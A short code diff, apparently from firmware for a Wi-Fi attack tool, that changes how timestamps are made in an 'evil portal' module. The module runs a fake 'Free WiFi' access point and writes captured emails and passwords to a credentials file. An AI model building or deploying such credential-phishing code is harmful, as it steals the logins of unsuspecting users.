@@ -1,7 +1,6 @@
 // pid PID::EVIL_PORTAL
 
 #include <LittleFS.h>
-#include <sys/time.h>
 
 const char* EVIL_PORTAL_SSID = "Free WiFi";
 const char* EVIL_PORTAL_CREDS_FILE = "/evil_portal_creds.txt";
@@ -19,12 +18,9 @@ void evilPortalSaveCreds(String email, String password) {
 		if (!f) return;
 	}
 
-	struct timeval tv;
-	gettimeofday(&tv, nullptr);
-	time_t now = tv.tv_sec;
-	struct tm* tm_info = localtime(&now);
-	char timeBuf[24];
-	strftime(timeBuf, sizeof(timeBuf), "%Y-%m-%d %H:%M:%S", tm_info);
+	DeviceTime dt = deviceGetTime();
+	char timeBuf[16];
+	snprintf(timeBuf, sizeof(timeBuf), "%02d:%02d:%02d", dt.hours, dt.minutes, dt.seconds);
 
 	String entry = String(timeBuf) + " | " + email + " | " + password + "\n";
 	f.print(entry);
